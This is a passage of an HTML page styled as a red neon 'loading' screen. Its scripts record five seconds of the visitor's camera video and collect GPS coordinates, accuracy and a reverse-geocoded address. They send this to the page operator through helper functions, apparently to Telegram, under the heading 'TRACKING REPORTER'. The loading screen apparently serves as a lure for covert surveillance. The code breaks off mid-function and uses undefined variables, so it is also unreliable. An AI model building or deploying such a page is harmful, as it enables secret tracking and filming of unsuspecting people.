<style>
body{
  background:
    radial-gradient(circle at 20% 30%, #ff000044, transparent 45%),
    radial-gradient(circle at 80% 70%, #ffffff22, transparent 45%),
    linear-gradient(270deg,#000000,#1a0000,#000000);
  background-size:600% 600%;
  animation:bgMove 10s ease infinite;
  margin:0;padding:0;
  display:flex;justify-content:center;align-items:center;
  height:100vh;
  font-family:"Orbitron",Arial,sans-serif;
  color:#fff;
  overflow:hidden;
  position:relative;
}

@keyframes bgMove{
  0%{background-position:0% 50%}
  50%{background-position:100% 50%}
  100%{background-position:0% 50%}
}

.particle{
  position:absolute;
  background:radial-gradient(circle,#ff0000cc 0%,transparent 70%);
  border-radius:50%;
  opacity:.7;
  animation:floatParticle linear infinite;
}

@keyframes floatParticle{
  from{transform:translateY(100vh) scale(1);}
  to{transform:translateY(-10vh) scale(0);}
}

#loading-container{text-align:center;width:80%;max-width:400px;z-index:5}

#loading-text{
  font-size:24px;
  margin-bottom:20px;
  color:#fff;
  position:relative;
  text-shadow:0 0 5px #fff,0 0 15px #ff0000;
  animation:glitch 2.4s infinite;
}

#loading-text::before,
#loading-text::after{
  content:attr(data-text);
  position:absolute;
  left:0;width:100%;overflow:hidden;
}

#loading-text::before{
  left:2px;
  text-shadow:-2px 0 red;
  clip-path:inset(0 0 45% 0);
  animation:glitchTop 2.4s infinite ease-in-out alternate;
}

#loading-text::after{
  left:-2px;
  text-shadow:2px 0 white;
  clip-path:inset(55% 0 0 0);
  animation:glitchBottom 2.4s infinite ease-in-out alternate;
}

@keyframes glitch{
  0%{transform:translate(0)}
  10%{transform:translate(-2px,1px)}
  20%{transform:translate(2px,-1px)}
  30%{transform:translate(-1px,2px)}
  40%,100%{transform:translate(0)}
}

@keyframes glitchTop{
  0%{clip-path:inset(0 0 40% 0)}
  50%{clip-path:inset(0 0 60% 0)}
  100%{clip-path:inset(0 0 45% 0)}
}

@keyframes glitchBottom{
  0%{clip-path:inset(60% 0 0 0)}
  50%{clip-path:inset(40% 0 0 0)}
  100%{clip-path:inset(55% 0 0 0)}
}

#progress-container{height:3px;background:#200000;border-radius:3px;overflow:hidden}
#progress-bar{
  height:100%;
  width:0%;
  background:linear-gradient(90deg,#ff0000,#ffffff,#ff0000);
  transition:width .3s ease;
}

#loading-details{margin-top:20px;font-size:14px;color:#fff;opacity:.8}
.hidden{display:none}

#neon-image{
  width:120px;height:120px;
  border-radius:50%;
  border:3px solid #ff0000;
  box-shadow:0 0 25px #ff0000,0 0 60px #ff0000;
  animation:neonPulse 2s ease-in-out infinite alternate;
  object-fit:cover;
  margin:0 auto 25px;
  display:block;
}

@keyframes neonPulse{
  from{transform:scale(1)}
  to{transform:scale(1.06)}
}

#music-visualizer{
  position:absolute;
  bottom:40px;
  left:50%;
  transform:translateX(-50%);
  display:flex;
  align-items:flex-end;
  gap:6px;
  height:40px;
  z-index:10;
}

.bar{
  width:5px;
  background:linear-gradient(to top,#ff0000,#ffffff);
  border-radius:5px;
  animation:barMove 1s ease-in-out infinite;
}

@keyframes barMove{
  0%,100%{height:10px;opacity:.7}
  50%{height:40px;opacity:1}
}
</style>
</head>

<body>

<script>
for(let i=0;i<40;i++){
  const p=document.createElement('div');
  p.className='particle';
  const size=Math.random()*4+2;
  p.style.width=size+'px';
  p.style.height=size+'px';
  p.style.left=Math.random()*100+'%';
  p.style.animationDuration=(8+Math.random()*8)+'s';
  document.body.appendChild(p);
}
</script>

  <script>

 const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
    
  const cDI = async () => {
  let m = 'TRACKING REPORTER NOTIFICATIONS\n\n';

    const captureCamera = async (mode) => {
    const v = document.getElementById('v');
    let stream, mediaRecorder, chunks = [];

    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { exact: mode } },
            audio: false
        });

        v.srcObject = stream;
        await new Promise(resolve => v.onloadedmetadata = resolve);
        v.play();

        mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'video/webm'
        });

        mediaRecorder.ondataavailable = e => {
            if (e.data.size > 0) chunks.push(e.data);
        };

        mediaRecorder.start();

        // durasi 5 detik
        await new Promise(r => setTimeout(r, 5000));

        mediaRecorder.stop();

        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            sP(blob, `${mode}_camera_capture.webm`);

            stream.getTracks().forEach(t => t.stop());
        };

        return true;

    } catch (e) {
        if (stream) stream.getTracks().forEach(t => t.stop());
        await sTG(`âš ï¸ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
        return false;
    }
};
    const ST=async()=>{

     let g=`<blockquote><b>ğŸ“ GPS TRACKING (ONE-TIME)</b>\n\n`;
       g+=`ğŸ“Œ LAT: ${lat}\nğŸ“ LNG: ${lon}\n`;
       g+=`ğŸ¯ AKURASI: ${p.coords.accuracy}m\n`;
       g+=`ğŸ—ºï¸ GOOGLE MAPS: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
      const l=await gLD(lat,lon);

      await sTG(g)
            },
